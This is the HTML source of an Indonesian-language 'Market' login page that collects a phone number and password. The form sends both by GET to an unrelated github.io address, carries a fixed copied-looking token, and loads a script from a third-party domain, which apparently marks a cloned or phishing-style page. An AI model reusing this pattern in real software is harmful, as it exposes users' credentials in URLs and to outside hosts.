<html lang="id">
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  <title>Login</title> 
  <style>
    * {
      box-sizing: border-box;
    }

  body, html {
  margin: 0;
  padding: 0;
  height: 100%;
  font-family: 'Segoe UI', sans-serif;
  background:#eee;
  background-size: cover;
  color: white;
}


    .bg {
     background-color:#eee;
      background-size: cover;
      background-position: center;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-box {
    background-color: #fff;

      padding: 30px;
      border-radius: 12px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .login-box img.logo {
      width: 50px;
      margin-bottom: 20px;
    }

    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      background-color: #eee;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 8px;
      font-size: 14px;
    }

    .login-box .remember {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 13px;
      margin: 10px 0;
      color: #222;
    }

    .login-box button {
      background-color:#FF7F50;
      color: #fff;
      padding: 12px;
      border: none;
      border-radius: 25px;
      font-weight: bold;
      width: 100%;
      margin-top: 10px;
      cursor: pointer;
    }

    .login-box .icons {
      margin-top: 20px;
      display: flex;
      justify-content: center;
      gap: 30px;
    }

    .login-box .icons img {
      width: 32px;
      height: 32px;
    }

    a {
      color:#FF7F50;
      text-decoration: none;
    }
  </style> 
  <link rel="preload" as="script" href="https://m-asento.com/public/msg/notifIt.js">
  <link rel="preload" as="script" href="https://code.jquery.com/jquery-1.11.3.min.js">
 </head> 
 <body> 
  <div class="bg"> 
   <div class="login-box"> 
    <form action="https://market-today.github.io/" method="GET" autocomplete="off"> 
     <input type="hidden" name="_token" value="ja0AEnCFtAmgDopW40nUQy7KCWRkmkxDPzf7XTAP"> 
     <img class="logo" src="Market.jpg" alt="Logo"> 
     <input type="text" name="phone" placeholder="Masukan Nomor Telepon" required> 
     <input type="password" name="password" placeholder="Masukan Kata Sandi" required> 
     <div class="remember"> 
      <label> <input type="checkbox" name="remember" checked> Ingat kata sandi </label> 
      <a href="index.html">Daftar akun &gt;</a> 
     </div> 
     <button type="submit">Masuk Sekarang</button> 
    </form> 
    <div class="icons"> 
     <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/telegram-app.png" alt="Telegram"></a> 
     <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/headset.png" alt="Customer Support"></a> 
    </div> 
   </div> 
  </div> 
  <div class="van-toast van-toast--middle van-toast--loading" style="z-index: 2005; display: none;"> 
   <div class="van-loading van-loading--circular van-toast__loading">
    <span class="van-loading__spinner van-loading__spinner--circular">
     <svg viewbox="25 25 50 50" class="van-loading__circular">
      <circle cx="50" cy="50" r="20" fill="none"></circle>
     </svg></span>
   </div> 
  </div> 
  <link rel="stylesheet" href="https://m-asento.com/public/msg/notifIt.css">
